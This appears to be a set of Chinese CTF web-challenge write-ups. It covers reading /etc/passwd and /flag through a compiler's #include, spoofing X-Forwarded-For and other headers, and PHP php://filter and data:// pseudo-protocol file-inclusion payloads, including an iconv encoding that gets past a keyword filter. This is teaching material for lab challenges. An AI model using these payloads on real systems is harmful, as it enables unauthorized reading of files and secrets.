# WEB---二月份

## [FireshellCTF2020]Caas
>做题人：余俊康
>题目url：https://buuoj.cn/challenges#[FireshellCTF2020]Caas
>知识点：代码分析

打开题目叫我们输入代码
![](attachments/Clipboard_2025-09-09-18-56-56.png)

输入一段c语言代码可以获得一份文件，但是接下来无从下手。
看了别人的wp说是利用编译报错，猜测flag在以文件形式存在服务器中
输入代码
```
#include '/etc/passwd'
```
输入上去依旧没用
说明是双引号
```
#include "/etc/passwd"
```
还是没用
再试一下
```
#include "/flag"
```
![](attachments/Clipboard_2025-09-09-19-02-16.png)
得到flag


## [MRCTF2020]PYWebsite
>做题人：余俊康
>题目地址：https://buuoj.cn/challenges#[MRCTF2020]PYWebsite
>知识点：XFF

打开题目是一个支付获取flag的恶搞界面
![](attachments/Clipboard_2025-09-09-19-03-54.png)
直接打开源页代码，查找flag
![](attachments/Clipboard_2025-09-09-19-06-06.png)
注意到这里有一个flag.php,去访问看看

又是一个恶搞的界面
“除了购买者和自己，没有人可以看到flag”，这句话就提示了要用XFF构造ip
![](attachments/Clipboard_2025-09-09-19-10-04.png)
搞完之后回显已经出现了flag，去看是不是在源码里
![](attachments/Clipboard_2025-09-09-19-10-25.png)
得到flag

## [NewStarCTF 2023 公开赛道]Begin of HTTP
>做题人：余俊康
>题目地址：https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]Begin%20of%20HTTP
>知识点：php协议

![](attachments/Clipboard_2025-09-09-19-23-10.png)
打开题目叫我们用Get方式传参
![](attachments/Clipboard_2025-09-09-19-24-05.png)
传参后叫我们用post方式传secret，但是不知道具体的值。去看了一下源码，里面有一段base64码是secret的值。
![](attachments/Clipboard_2025-09-09-19-28-52.png)
解码的结果是n3wst4rCTF2023g00000d
![](attachments/Clipboard_2025-09-09-19-32-04.png)
有出现提示，去修改cooike
![](attachments/Clipboard_2025-09-09-19-32-39.png)
修改user agent为NewStarCTF2023
然后修referer为newstarctf.com 
最后修改为127.0.0.1就可以了
得到flag了

## [SWPUCTF 2021 新生赛]PseudoProtocols
>做题人：余俊康
>题目url：https://www.nssctf.cn/problem/441
>知识点：php伪协议

![](https://doc.amqyy.cn/uploads/1979da23-76d6-4482-895a-b834a5a71667.png)
打开题目有一句提示，先去访问一下hint.php
访问失败，进去看什么都没有。看到题目是php伪协议的题目，所以用伪协议去读
构造url如下
```
http://node7.anna.nssctf.cn:20615/index.php?wllm=php://filter/read/convert.base64-encode/resource=hint.phpv
```
然后就得到一段base64码
![](https://doc.amqyy.cn/uploads/fde8cc89-7077-4bab-b709-d41cbd3a6aae.png)
解码后得到一段php代码
```php-template=
<?php
//go to /test2222222222222.php
?>
```
接着访问一下test2222222222222.php
访问得到一段php代码
```php-template=
 <?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?> 
```
```
http://node7.anna.nssctf.cn:20615/test2222222222222.php/?a=data://text/plain,I want flag
```
这里用的是只读模式，所以在这里可以用date://协议嵌入a的值，构造payload
![](https://doc.amqyy.cn/uploads/027c5cd8-d93e-4537-bacb-4d85fa2abbbe.png)
得到flag

## [NewStarCTF 2023 公开赛道]include 0。0
>做题人：余俊康
>题目url：https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]include%200%E3%80%820
>知识点：PHP伪协议，文件包含


```php
 <?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> nope
```
打开题目一段php代码
```
@include($file);
```
@ 是 PHP 的错误抑制符，它会抑制 include() 函数可能产生的错误信息
这道题目将base和rot给过滤掉是为了阻止我们用php伪协议获取base64码
但是还可以用其他编码方式比如构造如下payload
```
http://b13f2f6e-009f-47fe-aa54-e994a1e94a4b.node5.buuoj.cn:81/?file=php://filter/read=convert.iconv.SJIS*.UCS-4*/resource=flag.php
```
最后即可获取flag
![](https://doc.amqyy.cn/uploads/99c3cdaf-fa42-4d09-bb71-98d367e9d733.png)

## [MoeCTF 2022]Sqlmap_boy
>做题人：余俊康
>题目url：https://www.nssctf.cn/problem/3350
>知识点：sql

![](https://doc.amqyy.cn/uploads/8db315e4-4ad6-4bee-a759-d65d1ae9bbba.png)
打开题目是一个登录界面
